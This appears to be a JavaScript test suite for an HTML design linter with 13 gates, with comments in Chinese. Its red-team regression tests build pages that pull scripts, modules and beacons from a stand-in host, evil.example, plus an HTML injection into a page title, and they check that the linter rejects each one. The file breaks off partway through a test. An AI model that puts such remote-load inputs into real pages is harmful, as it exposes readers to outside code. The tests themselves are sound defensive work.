import { test } from "node:test";
import assert from "node:assert/strict";
import { checkHtml, REGISTRY } from "../src/check.mjs";
import { CANONICAL_TOKENS } from "../src/canonical-tokens.mjs";
import { readFileSync } from "node:fs";
import { fileURLToPath } from "node:url";
import { dirname, join } from "node:path";

const here = dirname(fileURLToPath(import.meta.url));

// —— 测试基线：一页全部合规的最小页面，每个坏样本只改一处 ——
const goodPage = `<!DOCTYPE html>
<html lang="zh-CN">
<head>
<meta charset="UTF-8">
<meta name="viewport" content="width=device-width, initial-scale=1">
<title>测试页</title>
<style>
${CANONICAL_TOKENS}
</style>
<style>
.hero { border-color: var(--accent); }
</style>
</head>
<body>
<h1 class="t-2">标题</h1>
<h2>节</h2>
<h3>小节</h3>
<img src="a.png" alt="示意图">
<div class="sim-node is-active" data-node="x">x</div>
<script>const SIM_STEPS = []; const ok = 1;</script>
</body>
</html>`;

const gate = (res, id) => res.gates.find((g) => g.id === id);
const run = (html) => checkHtml(html);

test("good page: 13/13 gates pass", () => {
  const res = run(goodPage);
  assert.equal(res.ok, true);
  assert.equal(res.passed, 13);
  assert.equal(res.total, 13);
});

test("single-h1: two h1 fails", () => {
  const res = run(goodPage.replace("<h2>节</h2>", "<h1>第二个</h1>"));
  assert.equal(gate(res, "single-h1").status, "fail");
});

test("heading-monotonic: h2 followed by h4 fails", () => {
  const res = run(goodPage.replace("<h3>小节</h3>", "<h4>跳档</h4>"));
  assert.equal(gate(res, "heading-monotonic").status, "fail");
});

test("head-meta: missing title / lang / viewport each fail", () => {
  assert.equal(gate(run(goodPage.replace("<title>测试页</title>", "")), "head-meta").status, "fail");
  assert.equal(gate(run(goodPage.replace('lang="zh-CN"', "")), "head-meta").status, "fail");
  assert.equal(gate(run(goodPage.replace(/<meta name="viewport"[^>]*>/, "")), "head-meta").status, "fail");
});

test("img-alt: img without alt fails", () => {
  const res = run(goodPage.replace('alt="示意图"', ""));
  assert.equal(gate(res, "img-alt").status, "fail");
});

test("tokens-present: missing marker fails", () => {
  const res = run(goodPage.replace("aha-design-tokens v1", "some other css"));
  assert.equal(gate(res, "tokens-present").status, "fail");
});

test("no-inline-colors: hex outside tokens block fails", () => {
  const res = run(goodPage.replace(".hero { border-color: var(--accent); }", ".hero { border-color: #ff0000; }"));
  assert.equal(gate(res, "no-inline-colors").status, "fail");
});

test("no-inline-colors: hex in style attribute fails", () => {
  const res = run(goodPage.replace("<h1 class=\"t-2\">标题</h1>", '<h1 class="t-2" style="color:#f00">标题</h1>'));
  assert.equal(gate(res, "no-inline-colors").status, "fail");
});

test("no-inline-colors: hex inside tokens block passes (that is where colors live)", () => {
  const res = run(goodPage); // tokens 块内有 #171310 等
  assert.equal(gate(res, "no-inline-colors").status, "pass");
});

test("no-inline-colors: href fragment '#top' is not a color (no false positive)", () => {
  const res = run(goodPage.replace("<h1", '<a id="top"></a><a href="#top">up</a>\n<h1'));
  assert.equal(gate(res, "no-inline-colors").status, "pass");
});

test("no-inline-colors: rgb()/hsl() outside tokens block fails", () => {
  const res = run(goodPage.replace(".hero { border-color: var(--accent); }", ".hero { border-color: rgb(1,2,3); }"));
  assert.equal(gate(res, "no-inline-colors").status, "fail");
});

test("classes-known: unknown c- class fails, known passes", () => {
  const res = run(goodPage.replace('class="t-2"', 'class="c-accent"'));
  assert.equal(gate(res, "classes-known").status, "pass");
  const bad = run(goodPage.replace('class="t-2"', 'class="c-not-a-color"'));
  assert.equal(gate(bad, "classes-known").status, "fail");
});

test("classes-known: sim classes validated against registry", () => {
  const bad = run(goodPage.replace('class="sim-node is-active"', 'class="sim-nodes is-active"'));
  assert.equal(gate(bad, "classes-known").status, "fail");
});

test("script-syntax: broken script fails", () => {
  const res = run(goodPage.replace("const ok = 1;", 'const say = "unterminated;'));
  assert.equal(gate(res, "script-syntax").status, "fail");
});

test("script-syntax: valid module import does not false-fail", () => {
  const res = run(
    goodPage.replace(
      "<script>const SIM_STEPS = []; const ok = 1;</script>",
      '<script type="module">import x from "x"; const ok = 1;</script>'
    )
  );
  assert.equal(gate(res, "script-syntax").status, "pass");
});

test("receipt shape: has gate list, counts, exit-ok flag", () => {
  const res = run(goodPage);
  assert.equal(res.gates.length, 13);
  for (const g of res.gates) assert.ok(["pass", "fail"].includes(g.status));
  assert.equal(res.ok, true);
});

test("real assets: reference.html and simulator.html pass all gates", () => {
  for (const f of ["../../assets/reference.html", "../../assets/simulator.html"]) {
    const html = readFileSync(join(here, f), "utf8");
    const res = checkHtml(html);
    const failed = res.gates.filter((g) => g.status === "fail");
    assert.deepEqual(failed.map((g) => g.id), [], `${f}: ${JSON.stringify(failed)}`);
  }
});

test("registry sync: c-*/t-* classes match assets/design-tokens.css definitions", () => {
  const css = readFileSync(join(here, "../../assets/design-tokens.css"), "utf8");
  const defined = new Set(
    [...css.matchAll(/\.((?:c|t)-[a-z0-9-]+)/g)].map((m) => m[1])
  );
  for (const cls of defined) assert.ok(REGISTRY.classes.includes(cls), `registry missing: ${cls}`);
  for (const cls of REGISTRY.classes) {
    if (/^(c|t)-/.test(cls)) assert.ok(defined.has(cls), `registry stale: ${cls}`);
  }
});

test("tokens-present: version marker required (bare name not enough)", () => {
  const res = run(goodPage.replace("aha-design-tokens v1", "aha-design-tokens"));
  assert.equal(gate(res, "tokens-present").status, "fail");
});

test("no-inline-colors: only the FIRST tokens block is exempt, a second marked block with hex fails", () => {
  const sneaky = goodPage.replace(
    "<h1 class=\"t-2\">标题</h1>",
    '<style>/* aha-design-tokens v1 */ .x { color: #ff0000; }</style>\n<h1 class="t-2">标题</h1>'
  );
  const res = run(sneaky);
  assert.equal(gate(res, "no-inline-colors").status, "fail");
});

// —— 评审加固：B1/B2/B3/M2/M3/M4 ——

test("B1: single-quoted and unquoted style/fill/class attributes are scanned", () => {
  const a = run(goodPage.replace("<h1", "<div style='color:#ff0000'>x</div>\n<h1"));
  assert.equal(gate(a, "no-inline-colors").status, "fail");
  const b = run(goodPage.replace("<h1", "<div fill='#ff0000'>x</div>\n<h1"));
  assert.equal(gate(b, "no-inline-colors").status, "fail");
  const c = run(goodPage.replace('class="t-2"', "class='c-evil'"));
  assert.equal(gate(c, "classes-known").status, "fail");
});

test("B2: 4/8-digit hex (#f00a, #ff0000aa) outside tokens block fails", () => {
  const a = run(goodPage.replace(".hero { border-color: var(--accent); }", ".hero { border-color: #f00a; }"));
  assert.equal(gate(a, "no-inline-colors").status, "fail");
  const b = run(goodPage.replace(".hero { border-color: var(--accent); }", ".hero { border-color: #ff0000aa; }"));
  assert.equal(gate(b, "no-inline-colors").status, "fail");
});

test("B3: external <script src> violates single-file contract → script-syntax fails", () => {
  const res = run(goodPage.replace(
    "<script>const SIM_STEPS = []; const ok = 1;</script>",
    '<script src="https://evil.example/x.js"></script>'
  ));
  assert.equal(gate(res, "script-syntax").status, "fail");
});

test("M2: a style block with marker comment but no real token selectors is not tokens", () => {
  const res = run(goodPage.replace(
    "<h2>节</h2>",
    "<style>/* aha-design-tokens v1 */ .fake { color: #ff0000; }</style>\n<h2>节</h2>"
  ));
  // 伪造 tokens 块不含 :root/--accent → 既不算 tokens，颜色也不豁免
  assert.equal(gate(res, "no-inline-colors").status, "fail");
});

test("M3: module script with multi-line import does not false-fail", () => {
  const res = run(goodPage.replace(
    "<script>const SIM_STEPS = []; const ok = 1;</script>",
    '<script type="module">import {\n  a,\n  b,\n} from "x";\nconst ok = 1;</script>'
  ));
  assert.equal(gate(res, "script-syntax").status, "pass");
});

test("M4: headings inside HTML comments are not counted", () => {
  const res = run(goodPage.replace("<h2>节</h2>", "<!-- <h1>commented</h1> -->\n<h2>节</h2>"));
  assert.equal(gate(res, "single-h1").status, "pass");
});

test("canonical sync: embedded canonical equals assets/design-tokens.css", async () => {
  const { CANONICAL_TOKENS } = await import("../src/canonical-tokens.mjs");
  // 归一换行:Windows checkout 的 autocrlf 会把 assets 变 CRLF,内容语义没变
  const css = readFileSync(join(here, "../../assets/design-tokens.css"), "utf8").replace(/\r\n/g, "\n");
  assert.equal(CANONICAL_TOKENS, css);
});

test("gate5: tampered tokens at current version fails; older snapshot passes", async () => {
  const { CANONICAL_TOKENS } = await import("../src/canonical-tokens.mjs");
  const ver = CANONICAL_TOKENS.match(/aha-design-tokens v(\d[\d.]*)/)[1];
  const tampered = CANONICAL_TOKENS.replace("#ffab2e", "#ffab2f");
  const page = (css) => `<!DOCTYPE html><html lang="zh-CN"><head><meta charset="UTF-8">
<meta name="viewport" content="width=device-width, initial-scale=1"><title>t</title>
<style>${css}</style></head><body><h1>t</h1></body></html>`;
  assert.equal(gate(run(page(tampered)), "tokens-present").status, "fail");
  const older = CANONICAL_TOKENS.replace(`v${ver}`, "v0.9");
  assert.equal(gate(run(page(older)), "tokens-present").status, "pass"); // 旧快照放行
  assert.equal(gate(run(page(CANONICAL_TOKENS)), "tokens-present").status, "pass");
});

test("gate6/8 误判修复: url(#id) paint 引用 / module 顶层 await / importmap 不误杀", () => {
  const a = run(goodPage.replace("<h1", '<svg><rect fill="url(#grad)"/></svg>\n<h1'));
  assert.equal(gate(a, "no-inline-colors").status, "pass");
  const b = run(goodPage.replace(
    "<script>const SIM_STEPS = []; const ok = 1;</script>",
    '<script type="module">import x from "x"; const r = await x();</script>'
  ));
  assert.equal(gate(b, "script-syntax").status, "pass");
  const c = run(goodPage.replace(
    "<script>const SIM_STEPS = []; const ok = 1;</script>",
    '<script type="importmap">{"imports":{"x":"./local.js"}}</script>'
  ));
  assert.equal(gate(c, "script-syntax").status, "pass");
  const d = run(goodPage.replace(
    "<script>const SIM_STEPS = []; const ok = 1;</script>",
    '<script type="importmap">{"imports":{"x":"https://e.example/x.js"}}</script>'
  ));
  assert.equal(gate(d, "script-syntax").status, "fail", "importmap 指向远程应拦");
});

test("gate6: 命名颜色字面量在 style 属性内被拦", () => {
  const res = run(goodPage.replace("<h1", '<div style="color:red">x</div>\n<h1'));
  assert.equal(gate(res, "no-inline-colors").status, "fail");
});

test("gate 9-11: questioner-ref / fail-tag / zh sim-label gates", () => {
  const a = run(goodPage.replace("<h2>节</h2>", "<p>先回答你的问题：就是这样。</p>"));
  assert.equal(gate(a, "no-questioner-ref").status, "fail");
  const b = run(goodPage.replace("<h2>节</h2>", '<div class="fail"><span class="tag">窗窄之困</span>x</div>'));
  assert.equal(gate(b, "fail-tag-consistency").status, "fail");
  const c = run(goodPage.replace('<div class="sim-node is-active" data-node="x">x</div>', '<div class="sim-node is-active" data-node="x"><span class="k">Merge</span>x</div>'));
  assert.equal(gate(c, "sim-label-lang").status, "fail");
  const d = run(goodPage.replace('<div class="sim-node is-active" data-node="x">x</div>', '<div class="sim-node is-active" data-node="x"><span class="k">ClientHello</span>x</div>'));
  assert.equal(gate(d, "sim-label-lang").status, "pass"); // 白名单
});

test("R-MINORS: named color in style block / single-quoted tag & k labels / ref in script ok", () => {
  const a = run(goodPage.replace(".hero { border-color: var(--accent); }", ".hero { border-color: crimson; }"));
  assert.equal(gate(a, "no-inline-colors").status, "fail");
  const b = run(goodPage.replace("<h2>节</h2>", "<div class='fail'><span class='tag'>坏料</span>x</div>"));
  assert.equal(gate(b, "fail-tag-consistency").status, "pass");
  const c = run(goodPage.replace("<h2>节</h2>", "<div class='fail'><span class='tag'>坏原料</span>x</div>"));
  assert.equal(gate(c, "fail-tag-consistency").status, "fail");
  const d = run(goodPage.replace('class="sim-node is-active" data-node="x">x</div>', "class='sim-node is-active' data-node='x'><span class='k'>Merge</span>x</div>"));
  assert.equal(gate(d, "sim-label-lang").status, "fail");
  const e = run(goodPage.replace("const ok = 1;", 'const s = "先回答你的问题";'));
  assert.equal(gate(e, "no-questioner-ref").status, "pass"); // 脚本字符串不误伤
});

test("final polish: font-family string exempt; unquoted class forms caught", () => {
  const a = run(goodPage.replace("border-color: var(--accent);", "border-color: var(--accent);font-family:'Red Hat Text',serif;"));
  assert.equal(gate(a, "no-inline-colors").status, "pass");
  const b = run(goodPage.replace("<h2>节</h2>", "<div class=fail><span class=tag>坏原料</span>x</div>"));
  assert.equal(gate(b, "fail-tag-consistency").status, "fail");
  const c = run(goodPage.replace('<div class="sim-node is-active" data-node="x">x</div>', "<div class=sim-node data-node=x><span class=k>Merge</span>x</div>"));
  assert.equal(gate(c, "sim-label-lang").status, "fail");
});

test("micro-FP: data-class attribute is not class", () => {
  const a = run(goodPage.replace("<h2>节</h2>", '<div data-class="tag">超长内容示意</div>'));
  assert.equal(gate(a, "fail-tag-consistency").status, "pass");
});

// —— 门 12：自测块（检索练习）——
// 依据 references/theory.md 第 7 层：测试效应（Roediger & Karpicke 2006）——
// 有「记」层的完整图解页必须带 ≥2 个自测问题，答案默认折叠（读者先答后看）。
const quizOk = `<section class="section quiz" data-quiz>
  <h2>合上页面前</h2>
  <ol class="quiz-q"><li>问题一</li><li>问题二</li></ol>
  <button type="button" class="quiz-toggle" data-quiz-toggle aria-expanded="false" aria-controls="quiz-answers">查看答案</button>
  <div class="quiz-ans" id="quiz-answers" data-quiz-answers hidden><p>答一</p><p>答二</p></div>
</section>`;
const withTakeaway = (quiz) =>
  goodPage.replace("<h3>小节</h3>", `<h3>小节</h3>\n<div class="takeaway"><p><mark>记</mark>住</p></div>\n${quiz}`);

test("gate12 self-test: page without takeaway is exempt (component demos / partial pages)", () => {
  assert.equal(gate(run(goodPage), "self-test").status, "pass");
});

test("gate12 self-test: takeaway without quiz block fails", () => {
  const res = run(withTakeaway(""));
  assert.equal(gate(res, "self-test").status, "fail");
});

test("gate12 self-test: takeaway + quiz (≥2 questions, answers hidden) passes", () => {
  const res = run(withTakeaway(quizOk));
  assert.equal(gate(res, "self-test").status, "pass", JSON.stringify(gate(res, "self-test")));
});

test("gate12 self-test: only one question fails", () => {
  const res = run(withTakeaway(quizOk.replace("<li>问题二</li>", "")));
  assert.equal(gate(res, "self-test").status, "fail");
});

test("gate12 self-test: answers not hidden by default fails (reader must answer first)", () => {
  const res = run(withTakeaway(quizOk.replace("data-quiz-answers hidden", "data-quiz-answers")));
  assert.equal(gate(res, "self-test").status, "fail");
});

test("gate12 self-test: quiz block without answers container fails", () => {
  const res = run(withTakeaway(quizOk.replace(/<div class="quiz-ans"[\s\S]*?<\/div>/, "")));
  assert.equal(gate(res, "self-test").status, "fail");
});

test("gate12 self-test: takeaway mentioned only in CSS is not a takeaway block", () => {
  const res = run(goodPage.replace(".hero { border-color: var(--accent); }", ".takeaway { border-color: var(--accent); }"));
  assert.equal(gate(res, "self-test").status, "pass");
});

// —— 门 13：数字账本 ——
// 依据 SKILL.md「数字纪律」：比例类数字（N% / N 倍）最容易"看起来像事实错误"；
// 完整页（有 takeaway）须带 [data-ledger]，正文出现的每个 N%/N倍 字面量都要在账本里有条目，
// 每条标 data-kind ∈ {实算, 出处, 估算}。
const ledger = (items) => `<details class="ledger" data-ledger><summary>本页数字从哪来</summary><ul>${items}</ul></details>`;
const fullPage = (body, led) =>
  goodPage.replace("<h3>小节</h3>", `<h3>小节</h3>\n${body}\n<div class="takeaway"><p><mark>记</mark>住</p></div>\n${quizOk}\n${led}`);

test("gate13 number-ledger: page without takeaway is exempt", () => {
  assert.equal(gate(run(goodPage.replace("<h3>小节</h3>", "<h3>小节</h3><p>省 40%</p>")), "number-ledger").status, "pass");
});

test("gate13 number-ledger: full page without ledger block fails", () => {
  assert.equal(gate(run(fullPage("<p>无数字</p>", "")), "number-ledger").status, "fail");
});

test("gate13 number-ledger: no ratio literals + empty ledger passes", () => {
  const res = run(fullPage("<p>无数字</p>", ledger("")));
  assert.equal(gate(res, "number-ledger").status, "pass", JSON.stringify(gate(res, "number-ledger")));
});

test("gate13 number-ledger: every N% / N倍 literal in body must appear in the ledger", () => {
  const body = `<p>误报率约 3.1%，吞吐提升 17 倍，另有 1,000 倍差距</p>`;
  const ok = ledger(
    `<li data-kind="实算"><b>3.1%</b> — (1-e^{-kn/m})^k，k=7,n/m=1/10</li>
     <li data-kind="出处"><b>17倍</b> — 论文表 2</li>
     <li data-kind="估算"><b>1000 倍</b> — 示意量级</li>`,
  );
  assert.equal(gate(run(fullPage(body, ok)), "number-ledger").status, "pass", JSON.stringify(gate(run(fullPage(body, ok)), "number-ledger")));
  const missing = ledger(`<li data-kind="实算"><b>3.1%</b> — 算式</li>`);
  const res = run(fullPage(body, missing));
  assert.equal(gate(res, "number-ledger").status, "fail");
  assert.match(gate(res, "number-ledger").detail, /17\(倍\)/);
});

test("gate13 number-ledger: literals inside <script>/<style>/comments/attributes are not counted", () => {
  const body = `<!-- 50% --><script>const x = "60%";</script><style>.a{width:70%}</style><div style="width:80%">文字</div>`;
  assert.equal(gate(run(fullPage(body, ledger(""))), "number-ledger").status, "pass");
});

test("gate13 number-ledger: SVG <text> percentages count as body numbers", () => {
  const body = `<svg viewBox="0 0 10 10"><text x="1" y="1">25%</text></svg>`;
  assert.equal(gate(run(fullPage(body, ledger(""))), "number-ledger").status, "fail");
  assert.equal(gate(run(fullPage(body, ledger(`<li data-kind="估算">25% — 示意</li>`))), "number-ledger").status, "pass");
});

test("gate13 number-ledger: modulo operator (95 % 3 = 2, column header '% 4') is not a percentage", () => {
  const body = `<table><tr><th>% 3</th><th>% 4</th></tr><tr><td>95 % 3 = 2</td><td>95 % 4 = 3</td></tr></table><p>取模：95 % 3 = 2 而 95 % 4 = 3</p>`;
  const res = run(fullPage(body, ledger("")));
  assert.equal(gate(res, "number-ledger").status, "pass", JSON.stringify(gate(res, "number-ledger")));
});

test("gate13 number-ledger: percentage right before a number outside tables still counts (no modulo misread)", () => {
  const body = `<p>命中率约 9.2%,详见下表。</p><table><tr><td>表格内 82% 豁免</td></tr></table>`;
  const res = run(fullPage(body, ledger(`<li data-kind="实算">82% — 已豁免</li>`)));
  assert.equal(gate(res, "number-ledger").status, "fail");
  assert.match(gate(res, "number-ledger").detail, /9\.2%/);
});

test("gate13 number-ledger: entry with unknown or missing data-kind fails", () => {
  const body = `<p>省 40%</p>`;
  assert.equal(gate(run(fullPage(body, ledger(`<li data-kind="猜的">40% — x</li>`))), "number-ledger").status, "fail");
  assert.equal(gate(run(fullPage(body, ledger(`<li>40% — x</li>`))), "number-ledger").status, "fail");
});

test("gate13 number-ledger: unfilled scaffold placeholder entry passes (scaffold stays green)", () => {
  const res = run(fullPage("<p>无数字</p>", ledger(`<li data-kind="实算">（SLOT8: 数字 — 算式/出处/假设）</li>`)));
  assert.equal(gate(res, "number-ledger").status, "pass");
});

test("governance: SIM_LABEL_WHITELIST exported as non-empty array of identifiers", async () => {
  const { SIM_LABEL_WHITELIST } = await import("../src/check.mjs");
  assert.ok(Array.isArray(SIM_LABEL_WHITELIST) && SIM_LABEL_WHITELIST.length >= 5);
  for (const w of SIM_LABEL_WHITELIST) assert.ok(/^[A-Z][A-Za-z0-9·ᵀ]*$/.test(w), `白名单应为大写开头的标识符: ${w}`);
});

// 倍/×N 写法归一(R1:正文「N 倍」账本写「×N」曾致误报)
test("gate13 number-ledger: N倍 in body covered by ×N wording in ledger", () => {
  const body = `<p>请求量变 10 倍,缓存收益才明显</p>`;
  const led = ledger(`<li data-kind="估算"><b>×10</b> — 量级示意</li>`);
  const res = run(fullPage(body, led));
  assert.equal(gate(res, "number-ledger").status, "pass", JSON.stringify(gate(res, "number-ledger")));
});

test("gate13 number-ledger: ×N in body also requires a ledger entry", () => {
  const body = `<p>并发 ×8 时吞吐见顶</p>`;
  const res = run(fullPage(body, ledger("")));
  assert.equal(gate(res, "number-ledger").status, "fail");
  assert.match(gate(res, "number-ledger").detail, /8/);
  assert.equal(gate(run(fullPage(body, ledger(`<li data-kind="实算"><b>8 并发</b> — 压测</li>`))), "number-ledger").status, "pass");
});

// 数据表内百分数豁免(R6:整表索账曾与账本≤6条冲突)
test("gate13 number-ledger: percentages inside <table> are exempt", () => {
  const body = `<table><caption>伯克利 1973(出处:Bickel et al.)</caption><tr><td>A 系女 82%</td><td>B 系女 68%</td></tr></table><p>整体却反转。</p>`;
  const res = run(fullPage(body, ledger("")));
  assert.equal(gate(res, "number-ledger").status, "pass", JSON.stringify(gate(res, "number-ledger")));
});
test("gate13 number-ledger: percentages outside tables still count", () => {
  const body = `<p>表外还有一句:整体低 4%。</p><table><tr><td>82%</td></tr></table>`;
  const res = run(fullPage(body, ledger("")));
  assert.equal(gate(res, "number-ledger").status, "fail");
  assert.match(gate(res, "number-ledger").detail, /4%/);
});

// 红队场景:改低版本号 + 篡改色值也必须挂(无快照放行后门)
test("gate5: downgraded version + tampered color fails (no snapshot backdoor)", async () => {
  const { CANONICAL_TOKENS } = await import("../src/canonical-tokens.mjs");
  const page = (css) => `<!DOCTYPE html><html lang="zh-CN"><head><meta charset="UTF-8"><title>t</title><style>${css}</style></head><body><h1>t</h1></body></html>`;
  const evil = CANONICAL_TOKENS.replace(/v[\d.]+/, "v0.9").replace("#ffab2e", "#00ff00");
  assert.equal(gate(run(page(evil)), "tokens-present").status, "fail");
  // 注释差异容忍:仅注释不同、变量一致 → 过(旧页面升级兼容)
  const commented = CANONICAL_TOKENS.replace("规则（SKILL.md 契约）：", "规则（本页样式契约,注释允许演化）：");
  assert.equal(gate(run(page(commented)), "tokens-present").status, "pass");
});

// 内容页信号:整删第 7 层(takeaway/自测/账本)但保留 ≥3 节眉 → 门 12/13 必须挂
test("gate12/13: deleting layer 7 entirely cannot dodge self-test/ledger gates", () => {
  const layers = ["01", "02", "03"].map((n) => `<p class="eyebrow" data-n="${n}">层${n}</p><h2>标题${n}</h2><p>这一段内容足够充实,构成内容页信号。</p>`).join("\n");
  const page = `<!DOCTYPE html><html lang="zh-CN"><head><meta charset="UTF-8"><title>t</title>
<style>${CANONICAL_TOKENS}</style></head><body><h1>t</h1>${layers}
<p>正文出现 30% 的比例数字。</p></body></html>`;
  const res = run(page);
  assert.equal(gate(res, "self-test").status, "fail", "无自测块须挂");
  assert.match(gate(res, "self-test").detail ?? "", /自测/);
  assert.equal(gate(res, "number-ledger").status, "fail", "无账本须挂");
});

// 门9 扩充:「如你所问」等新短语必须挂
test("gate9: expanded questioner references (如你所问/你提到的) fail", () => {
  const a = run(goodPage.replace("<h2>节</h2>", "<h2>节</h2><p>如你所问,这就是答案。</p>"));
  assert.equal(gate(a, "no-questioner-ref").status, "fail");
  const b = run(goodPage.replace("<h2>节</h2>", "<h2>节</h2><p>你提到的那个问题稍后展开。</p>"));
  assert.equal(gate(b, "no-questioner-ref").status, "fail");
});

// 红队四轮:oklch()/aqua 命名色逃逸(门6)
test("gate6: oklch()/aqua/named-color escapes fail", () => {
  const a = run(goodPage.replace(".hero", ".hero2").replace('<style>\n.hero2 { border-color: var(--accent); }', '<style>\n.hero2 { border-color: var(--accent); }\n.x1 { color: oklch(0.7 0.1 200); }\n.x2 { fill: aqua; }\n'));
  // 直接构造更直接:
  const page = goodPage.replace(".hero { border-color: var(--accent); }", ".hero { border-color: var(--accent); }\n.ok1 { color: oklch(0.7 0.1 200); }\n.ok2 { color: aqua; }");
  const res = run(page);
  assert.equal(gate(res, "no-inline-colors").status, "fail");
  assert.match(gate(res, "no-inline-colors").detail ?? "", /oklch|aqua/);
});

// 红队四轮:tokens 块尾增补样式(门5 全等拦截)
test("gate5: appending page styles inside tokens block fails", async () => {
  const { CANONICAL_TOKENS } = await import("../src/canonical-tokens.mjs");
  const page = `<!DOCTYPE html><html lang="zh-CN"><head><meta charset="UTF-8"><title>t</title><style>${CANONICAL_TOKENS}\n.sneak { color: #ff00aa; }</style></head><body><h1>t</h1></body></html>`;
  assert.equal(gate(run(page), "tokens-present").status, "fail");
});

// 红队四轮:门13 子串误配("95%" 不被 "195%" 满足)
test("gate13: substring false-match (95% vs 195%) no longer satisfies", () => {
  const body = `<p>误报率约 95%。</p>`;
  const led = ledger(`<li data-kind="出处"><b>195%</b> — 另一个来源</li>`);
  const res = run(fullPage(body, led));
  assert.equal(gate(res, "number-ledger").status, "fail");
  assert.match(gate(res, "number-ledger").detail ?? "", /95/);
});

// 红队四轮:module 脚本动态 import 远程模块(门8)
test("gate8: dynamic remote import in module script fails", () => {
  const page = goodPage.replace(
    "<script>const SIM_STEPS = []; const ok = 1;</script>",
    '<script type="module">const x = await import("https://evil.example/mod.js");</script>'
  );
  assert.equal(gate(run(page), "script-syntax").status, "fail");
});

// 红队四轮低档:门9「针对你的问题」/门13 全角数字
test("gate9+13: 针对你的问题 / fullwidth ９５％ both caught", () => {
  const a = run(goodPage.replace("<h2>节</h2>", "<h2>节</h2><p>针对你的问题,下面展开。</p>"));
  assert.equal(gate(a, "no-questioner-ref").status, "fail");
  const body = `<p>全角写的误报率约９５％。</p>`;
  const res = run(fullPage(body, ledger("")));
  assert.equal(gate(res, "number-ledger").status, "fail");
});

// 红队四轮中4:删 takeaway、改名 data-n,但内容体量大 → 门12/13 仍触发
test("gate12/13: renaming data-n and dropping takeaway cannot dodge when body is substantial", () => {
  const para = "这是一段有实质内容的长文,用来把正文体量推过内容页阈值,模拟真实六层图解页的文本量。".repeat(60);
  const page = `<!DOCTYPE html><html lang="zh-CN"><head><meta charset="UTF-8"><title>t</title>
<style>${CANONICAL_TOKENS}</style></head><body><h1>t</h1><p>${para}</p>
<p>正文出现 30% 的比例数字。</p></body></html>`;
  const res = run(page);
  assert.equal(gate(res, "self-test").status, "fail", "大体量页无自测须挂");
  assert.equal(gate(res, "number-ledger").status, "fail", "大体量页无账本须挂");
});

// 红队五轮回归
test("gate8: remote <link rel=stylesheet> and fetch() fail", () => {
  const a = run(goodPage.replace("</head>", '<link rel="stylesheet" href="https://cdn.example/x.css"></head>'));
  assert.equal(gate(a, "script-syntax").status, "fail");
  const b = run(goodPage.replace("const ok = 1;", 'const ok = 1; fetch("https://evil.example/x").then(r=>r.json());'));
  assert.equal(gate(b, "script-syntax").status, "fail");
});

test("gate12: answer-container li do not count as questions", () => {
  const one = `<section class="section quiz" data-quiz><h2>测</h2><ol><li>唯一一问?</li></ol><button type="button" data-quiz-toggle>查看答案</button><div data-quiz-answers hidden><ul><li>答1</li><li>答2</li><li>答3</li></ul></div></section>`;
  const res = run(fullPage("<p>无数字</p>", ledger("")).replace(/<section class="section quiz" data-quiz>[\s\S]*?<\/section>/, one));
  assert.equal(gate(res, "self-test").status, "fail", "1 问+3 答案 li 不满足 ≥2 问");
});

test("gate12: page CSS un-hiding .quiz-ans fails", () => {
  const page = goodPage.replace("<h3>小节</h3>", `<h3>小节</h3><div class="takeaway"><p><mark>记</mark></p></div>
<section class="section quiz" data-quiz><h2>q</h2><ol><li>一?</li><li>二?</li></ol><button type="button" data-quiz-toggle>x</button><div data-quiz-answers hidden><p>a</p></div></section>`).replace("</head>", "<style>.quiz-ans{display:block!important}</style></head>");
  const res = run(page);
  assert.equal(gate(res, "self-test").status, "fail");
});

test("gate13: dimension notation 3×4 grid not treated as ×4 倍", () => {
  const body = `<p>画一个 3 × 4 的网格来示意。</p>`;
  const res = run(fullPage(body, ledger("")));
  assert.equal(gate(res, "number-ledger").status, "pass");
});

// 红队六轮:标题注入(new 转义)、远程 img/url()、tag 多类名混排
test("red6: new escapes HTML in title (no injection)", async () => {
  const { spawnSync } = await import("node:child_process");
  const { mkdtempSync } = await import("node:fs");
  const { tmpdir } = await import("node:os");
  const dir = mkdtempSync(join(tmpdir(), "aha-inj-"));
  const r = spawnSync(process.execPath, [join(here, "../src/cli.mjs"), "new", "inj", 'X<h2>污染'], {
    encoding: "utf8", env: { ...process.env, AHA_HOME: dir },
  });
  const page = readFileSync(join(dir, "inj.html"), "utf8");
  assert.ok(!page.includes("<h1 class=\"display\">X<h2>"), "注入的 h2 必须被转义");
  assert.ok(page.includes("&lt;h2&gt;"), "标题里的 <h2> 应以实体存在");
});
test("red6: remote <img src=https> and CSS url(https) fail gate8", () => {
  const a = run(goodPage.replace("<h3>小节</h3>", '<h3>小节</h3><img src="https://evil.example/x.png" alt="远程">'));
  assert.equal(gate(a, "script-syntax").status, "fail");
  const b = run(goodPage.replace(".hero { border-color: var(--accent); }", ".hero { border-color: var(--accent); background: url(https://evil.example/bg.png); }"));
  assert.equal(gate(b, "script-syntax").status, "fail");
});
test("red6: gate10 catches tags with multiple class names", () => {
  const page = goodPage.replace("<h3>小节</h3>", '<h3>小节</h3><div class="fails"><span class="tag pill">超长五字标签</span><span class="tag">误删</span></div>');
  const res = run(page);
  assert.equal(gate(res, "fail-tag-consistency").status, "fail");
});

// 红队七评:script 任意 URL 字面量 / 内联 style 展开 quiz / object/embed/@import 字符串 / meta refresh
test("red7: URL literal in script by any API fails (ws/beacon/template-literal)", () => {
  const variants = [
    '<script>const ws = new WebSocket("wss://evil.example");</script>',
    '<script>navigator.sendBeacon("https://evil.example/b");</script>',
    '<script>fetch(`https://evil.example/x`);</script>',
    '<script>const xhr = new XMLHttpRequest(); xhr.open("GET", "https://evil.example");</script>',
    '<script type="module">import * as E from "https://evil.example/m.js";</script>',
  ];
  for (const v of variants) {
    const page = goodPage.replace("<script>const SIM_STEPS = []; const ok = 1;</script>", v);
    assert.equal(gate(run(page), "script-syntax").status, "fail", v.slice(0, 40));
  }
});
test("red7: @import string form / object/embed / meta refresh fail", () => {
  const a = run(goodPage.replace(".hero { border-color: var(--accent); }", '@import "https://evil.example/x.css";'));
  assert.equal(gate(a, "script-syntax").status, "fail");
  const b = run(goodPage.replace("<h3>小节</h3>", '<h3>小节</h3><object data="https://evil.example/o"></object>'));
  assert.equal(gate(b, "script-syntax").status, "fail");
  const c = run(goodPage.replace("</head>", '<meta http-equiv="refresh" content="0;url=https://evil.example"></head>'));
  assert.equal(gate(c, "script-syntax").status, "fail");
});
test("red7: inline style un-hiding quiz answers fails", () => {
  const page = goodPage
    .replace("<h3>小节</h3>", `<h3>小节</h3><div class="takeaway"><p><mark>记</mark></p></div>
